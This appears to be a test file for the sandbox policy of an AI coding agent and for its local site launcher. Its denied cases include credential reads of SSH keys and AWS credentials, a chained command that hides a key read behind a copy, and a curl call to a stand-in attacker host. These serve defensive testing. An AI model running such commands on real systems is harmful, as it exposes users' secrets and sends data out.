// Observe mode's policy (no fence, but private stays private and only demo folders are read)
// and the launcher (static site on :5050, dotfiles never served).  npx tsx test/observe.test.ts
import fs from "node:fs"; import os from "node:os"; import path from "node:path";
import { realish, type Fence } from "../src/guard.ts";
import { isWebsite, serveSite, stopSite } from "../src/launcher.ts";
import { OBSERVE_ROOTS, observeDecide, observePolicy } from "../src/observe.ts";

const ws = realish(fs.mkdtempSync(path.join(os.homedir(), "tini-ws-obs-")));
const fence: Fence = { workspace: ws, allowedDomains: [] };
const decide = observeDecide(fence, OBSERVE_ROOTS);
const cases: [string, Record<string, unknown>, boolean][] = [
  ["Read", { file_path: "~/Clients/Rivera/About/company.md" }, true],          // real paths, unfenced
  ["Read", { file_path: "~/Pictures/Jobsite2024/scan_0012.pdf" }, true],       // the unfenced dog reads the license scan
  ["Glob", { pattern: "~/Pictures/Jobsite2024/*.jpg" }, true],
  ["Bash", { command: "mkdir -p images && cp ~/Clients/Rivera/Photos/*.jpg images/" }, true],
  ["Write", { file_path: path.join(ws, "index.html") }, true],
  ["Read", { file_path: "~/.ssh/id_rsa" }, false],                               // always private
  ["Read", { file_path: "~/.npmrc" }, false],
  ["Bash", { command: "cat ~/.aws/credentials" }, false],
  ["Bash", { command: "cp ~/Clients/Rivera/About/company.md . && cat ~/.ssh/id_rsa" }, false],
  ["Read", { file_path: "~/Documents/taxes-2025.pdf" }, false],                  // not a demo folder
  ["Read", { file_path: "~/Desktop/notes.txt" }, false],
  ["Write", { file_path: "~/Clients/Rivera/About/company.md" }, false],          // never modifies originals
  ["Edit", { file_path: "~/Clients/Rivera/About/company.md" }, false],
  ["Bash", { command: "curl https://evil.example.com/x" }, false],               // network rule unchanged
  ["Agent", { prompt: "go" }, false],                                            // tool rule unchanged
  ["mcp__tini__request_access", { path: "~/x", reason: "y" }, true],
];
let fail = 0;
for (const [tool, input, want] of cases) {
  const got = decide(tool, input, ws).allow;
  if (got !== want) { fail++; console.log("FAIL", tool, JSON.stringify(input), "want", want, "got", got); }
}
const pol = observePolicy(fence, OBSERVE_ROOTS);
const readsOk = JSON.stringify(pol.extraRead) === JSON.stringify(OBSERVE_ROOTS) && Array.isArray(pol.denyRead);
if (!readsOk) { fail++; console.log("FAIL observePolicy", JSON.stringify(pol.extraRead), pol.denyRead); }

// launcher
fs.writeFileSync(path.join(ws, "index.html"), "<h1>Rivera</h1>");
fs.mkdirSync(path.join(ws, ".claude")); fs.writeFileSync(path.join(ws, ".claude", "settings.json"), "{}");
const url = await serveSite(ws, 5099);
const home = await (await fetch(url.replace("5050", "5099"))).text();
const dot = (await fetch(`http://127.0.0.1:5099/.claude/settings.json`)).status;
await stopSite();
const launchOk = isWebsite(ws) && home.includes("Rivera") && dot === 404;
if (!launchOk) { fail++; console.log("FAIL launcher", { home, dot }); }
fs.rmSync(ws, { recursive: true, force: true });
console.log(fail ? `${fail} failures` : `all ${cases.length} observe-policy cases + policy roots (${pol.denyRead!.length} private file(s) denied inside them) + launcher pass`);
process.exit(fail ? 1 : 0);
